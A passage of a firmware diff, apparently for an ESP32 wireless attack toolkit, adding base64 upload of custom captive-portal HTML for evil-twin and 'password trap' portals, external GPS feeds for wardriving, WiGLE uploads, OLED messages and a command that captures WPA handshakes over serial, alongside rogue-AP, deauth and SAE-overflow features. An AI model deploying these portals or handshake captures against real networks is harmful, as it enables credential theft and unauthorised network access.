+    if (!decoded) {
+        MY_LOG_INFO(TAG, "set_html_end: malloc failed for decoded HTML (%u bytes)",
+                    (unsigned)decoded_len);
+        heap_caps_free(html_b64_buf); html_b64_buf = NULL; html_b64_len = 0;
+        return 1;
+    }
+
+    size_t olen = 0;
+    ret = mbedtls_base64_decode((unsigned char *)decoded, decoded_len + 1, &olen,
+                                 (const unsigned char *)html_b64_buf, html_b64_len);
+    // Free accumulator — no longer needed
+    heap_caps_free(html_b64_buf);
+    html_b64_buf = NULL;
+    html_b64_len = 0;
+    html_b64_cap = 0;
+
+    if (ret != 0) {
+        MY_LOG_INFO(TAG, "set_html_end: base64 decode error (%d)", ret);
+        heap_caps_free(decoded);
+        return 1;
+    }
+    decoded[olen] = '\0';
+
+    // Swap into custom_portal_html (free works for both PSRAM and internal)
+    if (custom_portal_html) {
         free(custom_portal_html);
         custom_portal_html = NULL;
     }
-    
-    // Allocate and build the HTML string
-    custom_portal_html = (char*)malloc(total_len + 1);
-    if (custom_portal_html == NULL) {
-        MY_LOG_INFO(TAG, "Failed to allocate memory for HTML.");
-        return 1;
-    }
-    
-    custom_portal_html[0] = '\0';
-    for (int i = 1; i < argc; i++) {
-        strcat(custom_portal_html, argv[i]);
-        if (i < argc - 1) {
-            strcat(custom_portal_html, " ");
-        }
-    }
-    
+    custom_portal_html = decoded;
+
     MY_LOG_INFO(TAG, "Custom HTML set (%u bytes). Portal/Evil Twin/Karma will use this HTML.",
-                (unsigned int)strlen(custom_portal_html));
+                (unsigned)olen);
     return 0;
 }
 
@@ -9710,9 +11250,9 @@ static void gps_raw_task(void *pvParameters) {
 
 static int cmd_gps_set(int argc, char **argv) {
     if (argc < 2 || argv[1] == NULL) {
-        MY_LOG_INFO(TAG, "Usage: gps_set <m5|atgm>");
+        MY_LOG_INFO(TAG, "Usage: gps_set <m5|atgm|external|cap>");
         MY_LOG_INFO(TAG, "Current GPS module: %s (baud %d)",
-                    (current_gps_module == GPS_MODULE_M5STACK_GPS_V11) ? "M5StackGPS1.1" : "ATGM336H",
+                    gps_get_module_name(current_gps_module),
                     gps_get_baud_for_module(current_gps_module));
         return 0;
     }
@@ -9722,16 +11262,204 @@ static int cmd_gps_set(int argc, char **argv) {
         selected = GPS_MODULE_M5STACK_GPS_V11;
     } else if (strcasecmp(argv[1], "atgm") == 0 || strcasecmp(argv[1], "atgm336h") == 0) {
         selected = GPS_MODULE_ATGM336H;
+    } else if (strcasecmp(argv[1], "external") == 0 || strcasecmp(argv[1], "ext") == 0 ||
+               strcasecmp(argv[1], "usb") == 0 || strcasecmp(argv[1], "tab") == 0 ||
+               strcasecmp(argv[1], "tab5") == 0) {
+        selected = GPS_MODULE_EXTERNAL;
+    } else if (strcasecmp(argv[1], "cap") == 0 || strcasecmp(argv[1], "external_cap") == 0 ||
+               strcasecmp(argv[1], "lora_cap") == 0 || strcasecmp(argv[1], "adv_cap") == 0) {
+        selected = GPS_MODULE_EXTERNAL_CAP;
     } else {
-        MY_LOG_INFO(TAG, "Unknown module '%s'. Use 'm5' or 'atgm'.", argv[1]);
+        MY_LOG_INFO(TAG, "Unknown module '%s'. Use 'm5', 'atgm', 'external' (usb alias) or 'cap'.", argv[1]);
         return 1;
     }
 
     current_gps_module = selected;
+    if (gps_module_uses_external_feed(current_gps_module)) {
+        gps_sync_from_selected_external_source();
+    }
     gps_save_state_to_nvs();
     MY_LOG_INFO(TAG, "GPS module set to %s (baud %d). Restart GPS tasks if running.",
-                (current_gps_module == GPS_MODULE_M5STACK_GPS_V11) ? "M5StackGPS1.1" : "ATGM336H",
+                gps_get_module_name(current_gps_module),
                 gps_get_baud_for_module(current_gps_module));
+    return 0;
+}
+
+static int cmd_set_gps_position(int argc, char **argv) {
+    if (argc == 1) {
+        external_gps_position.valid = false;
+        if (current_gps_module == GPS_MODULE_EXTERNAL) {
+            gps_sync_from_selected_external_source();
+        }
+        oled_display_update_full("> GPS External", "  Fix cleared", "", "  No fix");
+        MY_LOG_INFO(TAG, "External GPS fix cleared (no fix).");
+        return 0;
+    }
+
+    if (argc < 3 || argc > 5 || argv[1] == NULL || argv[2] == NULL) {
+        MY_LOG_INFO(TAG, "Usage: set_gps_position <lat> <lon> [alt] [acc]");
+        MY_LOG_INFO(TAG, "Usage: set_gps_position   (no args = lost fix)");
+        return 1;
+    }
+
+    char *endptr = NULL;
+    float lat = strtof(argv[1], &endptr);
+    if (endptr == argv[1] || (endptr != NULL && *endptr != '\0') || !isfinite(lat)) {
+        MY_LOG_INFO(TAG, "Invalid latitude: '%s'", argv[1]);
+        return 1;
+    }
+
+    endptr = NULL;
+    float lon = strtof(argv[2], &endptr);
+    if (endptr == argv[2] || (endptr != NULL && *endptr != '\0') || !isfinite(lon)) {
+        MY_LOG_INFO(TAG, "Invalid longitude: '%s'", argv[2]);
+        return 1;
+    }
+
+    if (lat < -90.0f || lat > 90.0f) {
+        MY_LOG_INFO(TAG, "Latitude out of range (-90..90): %.7f", lat);
+        return 1;
+    }
+    if (lon < -180.0f || lon > 180.0f) {
+        MY_LOG_INFO(TAG, "Longitude out of range (-180..180): %.7f", lon);
+        return 1;
+    }
+
+    float alt = external_gps_position.altitude;
+    float acc = (external_gps_position.accuracy > 0.0f) ? external_gps_position.accuracy : 5.0f;
+
+    if (argc >= 4 && argv[3] != NULL) {
+        endptr = NULL;
+        alt = strtof(argv[3], &endptr);
+        if (endptr == argv[3] || (endptr != NULL && *endptr != '\0') || !isfinite(alt)) {
+            MY_LOG_INFO(TAG, "Invalid altitude: '%s'", argv[3]);
+            return 1;
+        }
+    }
+
+    if (argc >= 5 && argv[4] != NULL) {
+        endptr = NULL;
+        acc = strtof(argv[4], &endptr);
+        if (endptr == argv[4] || (endptr != NULL && *endptr != '\0') || !isfinite(acc) || acc < 0.0f) {
+            MY_LOG_INFO(TAG, "Invalid accuracy: '%s' (must be >= 0)", argv[4]);
+            return 1;
+        }
+    }
+
+    external_gps_position.latitude = lat;
+    external_gps_position.longitude = lon;
+    external_gps_position.altitude = alt;
+    external_gps_position.accuracy = acc;
+    external_gps_position.valid = true;
+
+    if (current_gps_module == GPS_MODULE_EXTERNAL) {
+        gps_sync_from_selected_external_source();
+    }
+
+    MY_LOG_INFO(TAG, "External GPS updated: Lat=%.7f Lon=%.7f Alt=%.2fm Acc=%.2fm",
+                external_gps_position.latitude, external_gps_position.longitude,
+                external_gps_position.altitude, external_gps_position.accuracy);
+
+    {
+        char oled_lat[20], oled_lon[20];
+        snprintf(oled_lat, sizeof(oled_lat), "  Lat %.4f", lat);
+        snprintf(oled_lon, sizeof(oled_lon), "  Lon %.4f", lon);
+        oled_display_update_full("> GPS External", oled_lat, oled_lon, "  Fix set");
+    }
+
+    if (current_gps_module != GPS_MODULE_EXTERNAL) {
+        MY_LOG_INFO(TAG, "Note: current module is %s. Run 'gps_set external' to use this feed in wardrive.",
+                    gps_get_module_name(current_gps_module));
+    }
+    return 0;
+}
+
+static int cmd_set_gps_position_cap(int argc, char **argv) {
+    if (argc == 1) {
+        external_cap_gps_position.valid = false;
+        if (gps_module_uses_external_cap_feed(current_gps_module)) {
+            gps_sync_from_selected_external_source();
+        }
+        oled_display_update_full("> GPS CAP Feed", "  Fix cleared", "", "  No fix");
+        MY_LOG_INFO(TAG, "External CAP GPS fix cleared (no fix).");
+        return 0;
+    }
+
+    if (argc < 3 || argc > 5 || argv[1] == NULL || argv[2] == NULL) {
+        MY_LOG_INFO(TAG, "Usage: set_gps_position_cap <lat> <lon> [alt] [acc]");
+        MY_LOG_INFO(TAG, "Usage: set_gps_position_cap   (no args = lost fix)");
+        return 1;
+    }
+
+    char *endptr = NULL;
+    float lat = strtof(argv[1], &endptr);
+    if (endptr == argv[1] || (endptr != NULL && *endptr != '\0') || !isfinite(lat)) {
+        MY_LOG_INFO(TAG, "Invalid latitude: '%s'", argv[1]);
+        return 1;
+    }
+
+    endptr = NULL;
+    float lon = strtof(argv[2], &endptr);
+    if (endptr == argv[2] || (endptr != NULL && *endptr != '\0') || !isfinite(lon)) {
+        MY_LOG_INFO(TAG, "Invalid longitude: '%s'", argv[2]);
+        return 1;
+    }
+
+    if (lat < -90.0f || lat > 90.0f) {
+        MY_LOG_INFO(TAG, "Latitude out of range (-90..90): %.7f", lat);
+        return 1;
+    }
+    if (lon < -180.0f || lon > 180.0f) {
+        MY_LOG_INFO(TAG, "Longitude out of range (-180..180): %.7f", lon);
+        return 1;
+    }
+
+    float alt = external_cap_gps_position.altitude;
+    float acc = (external_cap_gps_position.accuracy > 0.0f) ? external_cap_gps_position.accuracy : 5.0f;
+
+    if (argc >= 4 && argv[3] != NULL) {
+        endptr = NULL;
+        alt = strtof(argv[3], &endptr);
+        if (endptr == argv[3] || (endptr != NULL && *endptr != '\0') || !isfinite(alt)) {
+            MY_LOG_INFO(TAG, "Invalid altitude: '%s'", argv[3]);
+            return 1;
+        }
+    }
+
+    if (argc >= 5 && argv[4] != NULL) {
+        endptr = NULL;
+        acc = strtof(argv[4], &endptr);
+        if (endptr == argv[4] || (endptr != NULL && *endptr != '\0') || !isfinite(acc) || acc < 0.0f) {
+            MY_LOG_INFO(TAG, "Invalid accuracy: '%s' (must be >= 0)", argv[4]);
+            return 1;
+        }
+    }
+
+    external_cap_gps_position.latitude = lat;
+    external_cap_gps_position.longitude = lon;
+    external_cap_gps_position.altitude = alt;
+    external_cap_gps_position.accuracy = acc;
+    external_cap_gps_position.valid = true;
+
+    if (gps_module_uses_external_cap_feed(current_gps_module)) {
+        gps_sync_from_selected_external_source();
+    }
+
+    MY_LOG_INFO(TAG, "External CAP GPS updated: Lat=%.7f Lon=%.7f Alt=%.2fm Acc=%.2fm",
+                external_cap_gps_position.latitude, external_cap_gps_position.longitude,
+                external_cap_gps_position.altitude, external_cap_gps_position.accuracy);
+
+    {
+        char oled_lat[20], oled_lon[20];
+        snprintf(oled_lat, sizeof(oled_lat), "  Lat %.4f", external_cap_gps_position.latitude);
+        snprintf(oled_lon, sizeof(oled_lon), "  Lon %.4f", external_cap_gps_position.longitude);
+        oled_display_update_full("> GPS CAP Feed", oled_lat, oled_lon, "  Fix set");
+    }
+
+    if (!gps_module_uses_external_cap_feed(current_gps_module)) {
+        MY_LOG_INFO(TAG, "Note: current module is %s. Run 'gps_set cap' to use this feed in wardrive.",
+                    gps_get_module_name(current_gps_module));
+    }
     return 0;
 }
 
@@ -9753,16 +11481,21 @@ static void wardrive_task(void *pvParameters) {
     
     // Wait for GPS fix before starting
     MY_LOG_INFO(TAG, "Waiting for GPS fix...");
+    oled_display_update_full("> Wardrive", "  Waiting GPS...", "  Fix needed", "");
     if (!wait_for_gps_fix(120)) {  // Wait up to 120 seconds for GPS fix
         MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, not continuing without GPS data - please ensure clear view of the sky and try again.");
+        oled_display_update_full("> Wardrive", "  No GPS fix!", "  Stopping...", "");
         operation_stop_requested = true;
     } else {
         MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f", 
                    current_gps.latitude, current_gps.longitude);
+        oled_display_update_full("> Wardrive", "  GPS fix OK!", "  Starting scans", "");
     }
     
     MY_LOG_INFO(TAG, "Wardrive started. Use 'stop' command to stop.");
     
+    const bool external_feed = gps_module_uses_external_feed(current_gps_module);
+
     // Main wardrive loop (runs until user stops)
     int scan_counter = 0;
     while (wardrive_active && !operation_stop_requested) {
@@ -9773,20 +11506,44 @@ static void wardrive_task(void *pvParameters) {
             wardrive_active = false;
             break;
         }
-        // Read GPS data
-        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
-        if (len > 0) {
-            wardrive_gps_buffer[len] = '\0';
-            char* line = strtok(wardrive_gps_buffer, "\r\n");
-            while (line != NULL) {
-                if (parse_gps_nmea(line)) {
-                    MY_LOG_INFO(TAG, "GPS: Lat=%.7f Lon=%.7f Alt=%.1fm Acc=%.1fm", 
-                               current_gps.latitude, current_gps.longitude, 
-                               current_gps.altitude, current_gps.accuracy);
+        // Read GPS from selected source or pause if external fix is lost.
+        if (external_feed) {
+            gps_sync_from_selected_external_source();
+            if (!current_gps.valid) {
+                MY_LOG_INFO(TAG, "GPS fix lost! Pausing wardrive...");
+                oled_display_update_full("> Wardrive", "  GPS fix lost!", "  Pausing...", "");
+                while (!current_gps.valid && wardrive_active && !operation_stop_requested) {
+                    gps_sync_from_selected_external_source();
+                    vTaskDelay(pdMS_TO_TICKS(200));
                 }
-                line = strtok(NULL, "\r\n");
+                if (operation_stop_requested || !wardrive_active) {
+                    break;
+                }
+                MY_LOG_INFO(TAG, "GPS fix recovered: Lat=%.7f Lon=%.7f. Resuming wardrive.",
+                            current_gps.latitude, current_gps.longitude);
+                oled_display_update_full("> Wardrive", "  GPS recovered!", "  Resuming...", "");
+            }
+        } else {
+            int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
+            if (len > 0) {
+                wardrive_gps_buffer[len] = '\0';
+                char* line = strtok(wardrive_gps_buffer, "\r\n");
+                while (line != NULL) {
+                    if (parse_gps_nmea(line)) {
+                        MY_LOG_INFO(TAG, "GPS: Lat=%.7f Lon=%.7f Alt=%.1fm Acc=%.1fm",
+                                   current_gps.latitude, current_gps.longitude,
+                                   current_gps.altitude, current_gps.accuracy);
+                    }
+                    line = strtok(NULL, "\r\n");
+                }
             }
         }
+
+        float gps_lat = current_gps.latitude;
+        float gps_lon = current_gps.longitude;
+        float gps_alt = current_gps.altitude;
+        float gps_acc = current_gps.accuracy;
+        bool gps_valid_for_cycle = current_gps.valid;
         
         // Scan WiFi networks
         wifi_scan_config_t scan_cfg = {
@@ -9896,13 +11653,12 @@ static void wardrive_task(void *pvParameters) {
             
             // Format line for Wiggle format
             char line[512];
-            if (current_gps.valid) {
+            if (gps_valid_for_cycle) {
                 snprintf(line, sizeof(line), 
                         "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
                         mac_str, escaped_ssid, auth_mode, timestamp,
                         ap->primary, ap->rssi,
-                        current_gps.latitude, current_gps.longitude,
-                        current_gps.altitude, current_gps.accuracy);
+                        gps_lat, gps_lon, gps_alt, gps_acc);
             } else {
                 snprintf(line, sizeof(line), 
                         "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
@@ -9924,6 +11680,14 @@ static void wardrive_task(void *pvParameters) {
         }
         
         scan_counter++;
+        
+        {
+            char wd_l2[64], wd_l3[64], wd_l4[64];
+            snprintf(wd_l2, sizeof(wd_l2), "  Scan #%d", scan_counter);
+            snprintf(wd_l3, sizeof(wd_l3), "  %d nets logged", scan_count);
+            snprintf(wd_l4, sizeof(wd_l4), "  w%d.log", wardrive_file_counter);
+            oled_display_update_full("> Wardrive", wd_l2, wd_l3, wd_l4);
+        }
         
         // Check for stop command
         if (operation_stop_requested || !wardrive_active) {
@@ -9953,7 +11717,17 @@ static void wardrive_task(void *pvParameters) {
 }
 
 static int cmd_start_gps_raw(int argc, char **argv) {
+    {
+        const char *mod = gps_get_module_name(current_gps_module);
+        oled_display_update_full("> GPS Raw", "  NMEA output", mod, "  Streaming...");
+    }
     log_memory_info("start_gps_raw");
+
+    if (gps_module_uses_external_feed(current_gps_module)) {
+        MY_LOG_INFO(TAG, "start_gps_raw is unavailable in external GPS modes. Use '%s' instead.",
+                    gps_external_position_command_name(current_gps_module));
+        return 1;
+    }
 
     int baud = gps_get_baud_for_module(current_gps_module);
     if (argc >= 2 && argv[1] != NULL) {
@@ -10004,12 +11778,13 @@ static int cmd_start_gps_raw(int argc, char **argv) {
 
     MY_LOG_INFO(TAG, "GPS raw reader started at %d baud (%s). Use 'stop' to stop.",
                 baud,
-                (current_gps_module == GPS_MODULE_M5STACK_GPS_V11) ? "M5StackGPS1.1" : "ATGM336H");
+                gps_get_module_name(current_gps_module));
     return 0;
 }
 
 static int cmd_start_wardrive(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> Wardrive", "  GPS + WiFi", "  Logging to SD", "  Active...");
     log_memory_info("start_wardrive");
     
     // Ensure WiFi is initialized
@@ -10032,15 +11807,23 @@ static int cmd_start_wardrive(int argc, char **argv) {
     
     MY_LOG_INFO(TAG, "Starting wardrive mode...");
     
-    // Initialize GPS UART
-    int wardrive_baud = gps_get_baud_for_module(current_gps_module);
-    esp_err_t ret = init_gps_uart(wardrive_baud);
-    if (ret != ESP_OK) {
-        MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
-        return 1;
+    const bool external_feed = gps_module_uses_external_feed(current_gps_module);
+
+    // Initialize GPS source
+    esp_err_t ret = ESP_OK;
+    if (!external_feed) {
+        int wardrive_baud = gps_get_baud_for_module(current_gps_module);
+        ret = init_gps_uart(wardrive_baud);
+        if (ret != ESP_OK) {
+            MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
+            return 1;
+        }
+        MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX) at %d baud",
+                    GPS_TX_PIN, GPS_RX_PIN, wardrive_baud);
+    } else {
+        MY_LOG_INFO(TAG, "Using external GPS feed. Provide fixes via '%s'.",
+                    gps_external_position_command_name(current_gps_module));
     }
-    MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX) at %d baud",
-                GPS_TX_PIN, GPS_RX_PIN, wardrive_baud);
     
     // Initialize SD card main
     ret = init_sd_card();
@@ -10661,6 +12444,9 @@ static void dns_server_task(void *pvParameters) {
 
 // Start portal command
 static int cmd_start_portal(int argc, char **argv) {
+    oled_display_update_full("> Captive Portal",
+        argc >= 2 ? argv[1] : "  No SSID",
+        "  Password trap", "  Waiting...");
     log_memory_info("start_portal");
     
     // Ensure WiFi is initialized
@@ -10681,9 +12467,17 @@ static int cmd_start_portal(int argc, char **argv) {
         return 0;
     }
     
-    const char *ssid = argv[1];
+    // Concatenate all arguments to support SSIDs with spaces
+    // e.g. start_portal Darmowy Internet → "Darmowy Internet"
+    static char ssid_buf[33]; // 32 chars max + NUL
+    ssid_buf[0] = '\0';
+    for (int i = 1; i < argc; i++) {
+        if (i > 1) strncat(ssid_buf, " ", sizeof(ssid_buf) - strlen(ssid_buf) - 1);
+        strncat(ssid_buf, argv[i], sizeof(ssid_buf) - strlen(ssid_buf) - 1);
+    }
+    const char *ssid = ssid_buf;
     size_t ssid_len = strlen(ssid);
-    
+
     // Validate SSID length (WiFi SSID max is 32 characters)
     if (ssid_len == 0 || ssid_len > 32) {
         MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
@@ -10919,6 +12713,10 @@ static int cmd_start_portal(int argc, char **argv) {
 
 // Start password-protected rogue AP with captive portal and optional deauth
 static int cmd_start_rogueap(int argc, char **argv) {
+    oled_display_update_full("> Rogue AP",
+        argc >= 2 ? argv[1] : "  No SSID",
+        "  WPA2 + Portal", "  Active...");
+    rogueap_mode_active = true;
     log_memory_info("start_rogueap");
     
     // Validate arguments
@@ -11675,6 +13473,13 @@ static void bt_scan_task(void *pvParameters)
                 led_clear();
             }
         }
+        if (i % 10 == 0) {
+            char ble_l2[64], ble_l3[64], ble_l4[64];
+            snprintf(ble_l2, sizeof(ble_l2), "  Scanning %d/10s", i / 10);
+            snprintf(ble_l3, sizeof(ble_l3), "  %d devices", bt_device_count);
+            snprintf(ble_l4, sizeof(ble_l4), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
+            oled_display_update_full("> BLE Scan", ble_l2, ble_l3, ble_l4);
+        }
         vTaskDelay(pdMS_TO_TICKS(100));
     }
     
@@ -11683,6 +13488,13 @@ static void bt_scan_task(void *pvParameters)
     
     bt_stop_scan();
     bt_scan_active = false;
+    
+    {
+        char ble_l3[64], ble_l4[64];
+        snprintf(ble_l3, sizeof(ble_l3), "  %d devices", bt_device_count);
+        snprintf(ble_l4, sizeof(ble_l4), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
+        oled_display_update_full("> BLE Scan", "  Scan done!", ble_l3, ble_l4);
+    }
     
     // Print results
     MY_LOG_INFO(TAG, "");
@@ -11729,8 +13541,11 @@ static void bt_airtag_scan_task(void *pvParameters)
     MY_LOG_INFO(TAG, "Use 'stop' command to stop scanning.");
     MY_LOG_INFO(TAG, "");
     
+    int at_cycle = 0;
+    
     while (bt_airtag_scan_active && !operation_stop_requested) {
         bt_reset_counters();
+        at_cycle++;
         
         int rc = bt_start_scan();
         if (rc != 0) {
@@ -11750,6 +13565,12 @@ static void bt_airtag_scan_task(void *pvParameters)
                     led_clear();
                 }
             }
+            if (i % 20 == 0) {
+                char at_l2[64], at_l4[64];
+                snprintf(at_l2, sizeof(at_l2), "  Cycle #%d", at_cycle);
+                snprintf(at_l4, sizeof(at_l4), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
+                oled_display_update_full("> AirTag Scan", at_l2, "  Scanning...", at_l4);
+            }
             vTaskDelay(pdMS_TO_TICKS(100));
         }
         
@@ -11761,6 +13582,12 @@ static void bt_airtag_scan_task(void *pvParameters)
         
         // Output in requested format: airtag_count,smarttag_count
         printf("%d,%d\n", bt_airtag_count, bt_smarttag_count);
+        
+        {
+            char at_l3[64];
+            snprintf(at_l3, sizeof(at_l3), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
+            oled_display_update_full("> AirTag Scan", "  Cycle done", at_l3, "  Next cycle...");
+        }
         
         // Immediately start next scan cycle (no wait)
     }
@@ -11851,6 +13678,11 @@ static void bt_tracking_task(void *pvParameters)
  */
 static int cmd_scan_bt(int argc, char **argv)
 {
+    if (argc > 1) {
+        oled_display_update_full("> BLE Track", argv[1], "  Tracking MAC", "  Scanning...");
+    } else {
+        oled_display_update_full("> BLE Scan", "  Discovering...", "  10s scan time", "  Working...");
+    }
     log_memory_info("scan_bt");
     
     // Ensure BLE is initialized (may reboot if WiFi was active)
@@ -11924,6 +13756,7 @@ static int cmd_scan_bt(int argc, char **argv)
 static int cmd_scan_airtag(int argc, char **argv)
 {
     (void)argc; (void)argv;
+    oled_display_update_full("> AirTag Scan", "  Apple+Samsung", "  Continuous", "  Scanning...");
     log_memory_info("scan_airtag");
     
     // Ensure BLE is initialized (may reboot if WiFi was active)
@@ -12177,6 +14010,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&save_handshake_cmd));
 
+    const esp_console_cmd_t handshake_serial_cmd = {
+        .command = "start_handshake_serial",
+        .help = "Captures WPA handshakes (sniffer mode) and dumps PCAP/HCCAPX as base64 via serial. No SD card needed.",
+        .hint = NULL,
+        .func = &cmd_start_handshake_serial,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_serial_cmd));
+
     const esp_console_cmd_t wpasec_key_cmd = {
         .command = "wpasec_key",
         .help = "Set/read wpa-sec.stanev.org API key: wpasec_key set <key> | wpasec_key read",
@@ -12194,6 +14036,24 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&wpasec_upload_cmd));
+
+    const esp_console_cmd_t wigle_key_cmd = {
+        .command = "wigle_key",
+        .help = "Set/read WiGLE API credentials: wigle_key set <api_name> <api_token> | wigle_key read",
+        .hint = NULL,
+        .func = &cmd_wigle_key,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wigle_key_cmd));
+
+    const esp_console_cmd_t wigle_upload_cmd = {
+        .command = "wigle_upload",
+        .help = "Upload Wardrive files to WiGLE: wigle_upload [file1 file2 ...] (no args = upload all)",
+        .hint = NULL,
+        .func = &cmd_wigle_upload,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wigle_upload_cmd));
 
        const esp_console_cmd_t sae_overflow_cmd = {
         .command = "sae_overflow",
@@ -12233,12 +14093,30 @@ static void register_commands(void)
 
     const esp_console_cmd_t gps_set_cmd = {
         .command = "gps_set",
-        .help = "Select GPS module: gps_set <m5|atgm>",
-        .hint = "<m5|atgm>",
+        .help = "Select GPS module: gps_set <m5|atgm|external|cap> (usb alias for external)",
+        .hint = "<m5|atgm|external|cap>",
         .func = &cmd_gps_set,
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&gps_set_cmd));
+
+    const esp_console_cmd_t set_gps_position_cmd = {
+        .command = "set_gps_position",
+        .help = "Set external GPS fix: set_gps_position <lat> <lon> [alt] [acc] | no args = lost fix",
+        .hint = "[lat lon [alt] [acc]]",
+        .func = &cmd_set_gps_position,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&set_gps_position_cmd));
+
+    const esp_console_cmd_t set_gps_position_cap_cmd = {
+        .command = "set_gps_position_cap",
+        .help = "Set external CAP GPS fix: set_gps_position_cap <lat> <lon> [alt] [acc] | no args = lost fix",
+        .hint = "[lat lon [alt] [acc]]",
+        .func = &cmd_set_gps_position_cap,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&set_gps_position_cap_cmd));
 
     const esp_console_cmd_t wardrive_cmd = {
         .command = "start_wardrive",
@@ -12293,6 +14171,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&vendor_cmd));
+
+    const esp_console_cmd_t display_cmd = {
+        .command = "display",
+        .help = "Display mode: display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read",
+        .hint = NULL,
+        .func = &cmd_display,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&display_cmd));
 
     const esp_console_cmd_t boot_button_cmd = {
         .command = "boot_button",
@@ -12501,14 +14388,32 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&select_html_cmd));
 
+    const esp_console_cmd_t set_html_begin_cmd = {
+        .command = "set_html_begin",
+        .help = "Start chunked HTML transfer (base64). Follow with set_html <chunk> then set_html_end",
+        .hint = NULL,
+        .func = &cmd_set_html_begin,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&set_html_begin_cmd));
+
     const esp_console_cmd_t set_html_cmd = {
         .command = "set_html",
-        .help = "Set custom portal HTML from string: set_html <html>",
+        .help = "Append base64 chunk during HTML transfer: set_html <base64_chunk>",
         .hint = NULL,
         .func = &cmd_set_html,
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&set_html_cmd));
+
+    const esp_console_cmd_t set_html_end_cmd = {
+        .command = "set_html_end",
+        .help = "Finish chunked HTML transfer — decode and activate custom portal HTML",
+        .hint = NULL,
+        .func = &cmd_set_html_end,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&set_html_end_cmd));
 
     // BLE Scanner commands
     const esp_console_cmd_t scan_bt_cmd = {
@@ -12580,19 +14485,100 @@ void app_main(void) {
     printf("PSRAM support disabled in config\n");
 #endif
 
-//     printf("Step 3: Init NVS\n");
+    // NVS must be ready before loading persisted display mode.
     ESP_ERROR_CHECK(nvs_flash_init());
+    display_mode_load_from_nvs();
+    oled_display_set_forced_type(display_forced_mode);
+    MY_LOG_INFO(TAG, "Display mode configured: %s", display_mode_to_str(display_forced_mode));
+
+    // Initialize display module (auto-detect SSD1306 / SH1107 / SH1106 / Unit LCD)
+    oled_display_init();
+    {
+        const char *display_name = "NONE";
+        char display_desc[64];
+        int disp_addr7 = oled_display_get_i2c_addr_7bit();
+        int disp_addr_raw = oled_display_get_i2c_addr_raw();
+        snprintf(display_desc, sizeof(display_desc), "not detected");
+        switch (oled_display_get_type()) {
+            case DISPLAY_SSD1306:
+                display_name = "SSD1306";
+                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
+                         disp_addr_raw, disp_addr7);
+                break;
+            case DISPLAY_SH1107:
+                display_name = "SH1107";
+                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
+                         disp_addr_raw, disp_addr7);
+                break;
+            case DISPLAY_SH1106:
+                display_name = "SH1106";
+                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
+                         disp_addr_raw, disp_addr7);
+                break;
+            case DISPLAY_UNIT_LCD:
+                display_name = "UNIT_LCD";
+                snprintf(display_desc, sizeof(display_desc), "addr 0x%02X", disp_addr7);
+                break;
+            case DISPLAY_NONE:
+            default:
+                display_name = "NONE";
+                snprintf(display_desc, sizeof(display_desc), "check display wiring / I2C");
+                break;
+        }
+        MY_LOG_INFO(TAG, "Display auto-detect: %s (%s)", display_name, display_desc);
+    }
+    oled_display_update_full("> JanOS v" JANOS_VERSION, "  Booting...", "", "");
+    vTaskDelay(pdMS_TO_TICKS(80));
+
+//     printf("Step 3: Init NVS\n");
     ota_load_channel_from_nvs();
     wpasec_load_key_from_nvs();
+    wigle_load_key_from_nvs();
     ota_mark_valid_if_pending();
     ota_log_boot_info();
+    {
+        const char *display_name = "NONE";
+        char display_desc[64];
+        int disp_addr7 = oled_display_get_i2c_addr_7bit();
+        int disp_addr_raw = oled_display_get_i2c_addr_raw();
+        snprintf(display_desc, sizeof(display_desc), "not detected");
+        switch (oled_display_get_type()) {
+            case DISPLAY_SSD1306:
+                display_name = "SSD1306";
+                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
+                         disp_addr_raw, disp_addr7);
+                break;
+            case DISPLAY_SH1107:
+                display_name = "SH1107";
+                snprintf(display_desc, sizeof(display_desc), "addr raw 0x%02X / 7-bit 0x%02X",
